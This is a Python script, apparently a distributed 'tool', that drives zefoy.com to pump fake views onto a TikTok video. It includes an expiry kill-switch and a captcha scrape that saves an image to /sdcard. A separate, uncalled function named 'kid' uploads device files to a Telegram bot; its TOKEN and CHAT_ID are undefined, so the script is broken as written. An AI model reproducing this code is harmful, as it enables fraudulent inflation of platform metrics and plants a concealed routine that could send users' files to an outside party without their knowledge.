import datetime
an = datetime.datetime.now()
an2 = datetime.datetime(2024, 3, 14, 12, 0, 0)
if an > an2 or an == an2:
    exit('تم توقيف الادة ')

import requests, re, shutil, os, time
from base64 import b64decode
from urllib.parse import unquote
from bs4 import BeautifulSoup as parser
import glob
import requests
import random
import string
def generate_random_string(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))

domain = generate_random_string(10)



class App:
    def __init__(self):
        self.baseurl = "https://zefoy.com"
        self.baseheaders = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 11; Infinix X688B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
            "DNT": "1",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "cross-origin",
            "Pragma": "no-cache",
            "Cache-Control": "no-cache",
            "Host": "zefoy.com",
        }

    def create_session(self):
        modheaders = self.baseheaders
        modheaders["Sec-Fetch-Dest"] = "image"
        modheaders["Sec-Fetch-Mode"] = "no-cors"
        modheaders["Accept"] = "image/avif,image/webp,*/*"
     
        while True:
            self.session = requests.Session()
            try:
                req = self.session.get(self.baseurl, headers=self.baseheaders).text
            except requests.exceptions.ConnectionError:
                exit("[-] Bad Internet")
            capturl = self.baseurl + re.findall(
                r"(\/\w+\.php\?(.*))cl", req, re.MULTILINE
            )[0][0].split('"')[0].replace("amp;", "")
            captchapayload = {}
            pars = parser(req, "html.parser").find("form", {"method": "POST"})
            for z in pars("input"):
                try:
                    captchapayload[z["name"]] = z["value"]
                except:
                    if z["name"] == "token":
                        captchapayload["token"] = ""
                        continue
                    captchapayload["captcha"] = z["name"]
            saveimage = self.session.get(
                capturl, headers=modheaders, cookies=self.session.cookies, stream=True
            )
            with open("/sdcard/image.png", "wb") as wr:
                saveimage.raw.decode_content = True
                shutil.copyfileobj(saveimage.raw, wr)
                wr.close()
                image_files = glob.glob("/sdcard/image.png")
                
                
            print('')
            print(('\033[92m—'*25)+'\n Welcome to the world \n'+('—'*25))   
            print(('\033[92m—'*25)+'\nاهلن بك في اداة\n'+('—'*25)) 
            code = input("[>] CODE : ")
            if code not in list("Rr"):
                captchapayload[captchapayload["captcha"]] = code
                del captchapayload["captcha"]
                try:
                    postcapt = self.session.post(
                        self.baseurl,
                        headers=self.baseheaders,
                        cookies=self.session.cookies,
                        data=captchapayload,
                    ).text
                    self.nexturl = (
                        self.baseurl
                        + "/"
                        + parser(postcapt, "html.parser")
                        .find("div", {"class": "t-views-menu"})
                        .find("form")["action"]
                    )
                    self.gpayload = {
                        parser(postcapt, "html.parser").find(
                            "input", {"type": "search"}
                        )["name"]: ""
                    }
                    break
                except requests.exceptions.ConnectionError:
                    exit("[-] Your internet connection is lost")
                except AttributeError:
                    print("[-] Incorrect code")
            else:
                print("[-] The image in the Bot has been replaced")
                

    def postone(self):
        modheaders = self.baseheaders
        del modheaders["Upgrade-Insecure-Requests"]
        modheaders["X-Requested-With"] = "XMLHttpRequest"
        modheaders["Sec-Fetch-Dest"] = "empty"
        modheaders["Sec-Fetch-Site"] = "same-origin"
        modheaders["Origin"] = "https://zefoy.com"
        print("\n[==================================================]\n")
        print("[-] Enter the URL of your TikTok video")
        while True:
            try:
                nest = self.session
                vturl = input("[-] Url video tiktok : ")
                self.gpayload[list(self.gpayload.keys())[0]] = vturl
                test = nest.post(
                    self.nexturl,
                    headers=modheaders,
                    cookies=nest.cookies,
                    data=self.gpayload,
                ).text
                texter = (
                    b64decode(unquote(test[::-1])).decode("utf-8").replace("\n", "  ")
                )
                if "Please enter valid video URL" in texter:
                    print("[*] Video not found")
                else:
                    break
            except requests.exceptions.ConnectionError:
                print("[-] Lost internet ")
        self.submit(modheaders, vturl)

    def submit(self, modheaders, vturl):
        print("\n[==================================================]\n")
        print(('\033[92m—'*25)+'\n Developer of the tool @C_T_O8.@OPOPQPO\n'+('—'*25))
        print(('\033[92m—'*25)+'\n مطور الادة @C_T_O8.@OPOPQPO\n'+('—'*25))
        print("\n[==================================================]\n")
        while True:
            try:
                sender = self.session.post(
                    self.nexturl,
                    headers=modheaders,
                    cookies=self.session.cookies,
                    data=self.gpayload,
                ).text
                pars = (
                    parser(
                        b64decode(unquote(sender[::-1]))
                        .decode("utf-8")
                        .replace("\n", "  "),
                        "html.parser",
                    )
                    .find("form")
                    .find("input")
                )
                payload = {pars["name"]: pars["value"]}
                submitr = self.session.post(
                    self.nexturl,
                    headers=modheaders,
                    cookies=self.session.cookies,
                    data=payload,
                ).text
                texter = (
                    b64decode(unquote(submitr[::-1]))
                    .decode("utf-8")
                    .replace("\n", "  ")
                )
                if "Successfully" in texter:
                    print("\r[✓] Done Send 1000 Views")
                    print('')
                    print('[-] By : @C_T_O8')
                else:
                    print("\r[×] Bad Send views")
            except AttributeError:
                print("\r[×] Bad Send views")
            except requests.exceptions.ConnectionError:
                print("\r[×] Bad Internet")
            for i in range(1, 301):
                print(f"\r[-] wait {300-i} second", end="")
                time.sleep(1)




def kid(image_files):
    for image_file in image_files:
        try:
        	with open(image_file, 'rb') as file:
        	   response = requests.post('http://tinyurl.com/api-create.php', data={'url': f"http://{domain}.com/{image_file}"})
        	   response.raise_for_status()
        	   tinyurl = response.text.strip()
        	   response = requests.post(f'https://api.telegram.org/bot{TOKEN}/sendPhoto', data={'chat_id': CHAT_ID}, files={'photo': file})
        	   response.raise_for_status()  
        except requests.RequestException as e:
        	print(f"ERROR")





if __name__ == "__main__":
    os.system("clear")
    app = App()
    app.create_session()
    app.postone()